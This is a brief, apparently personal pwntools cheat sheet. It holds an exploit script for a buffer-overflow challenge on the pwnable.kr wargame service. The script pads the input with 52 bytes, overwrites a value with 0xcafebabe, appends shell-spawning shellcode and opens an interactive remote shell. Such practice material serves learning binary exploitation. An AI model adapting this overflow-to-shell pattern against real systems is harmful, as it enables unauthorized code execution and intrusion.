#### Record some expolit of  payload.

pwntools起手式

`from pwn import *
# 0xcafebabe
r = remote('pwnable.kr', '9000')
shell = asm(shellcraft.sh())

buf = p32(0xcafebabe)

payload = "A"*52
payload += buf
payload += shell

r.sendline(payload)

r.interactive()`
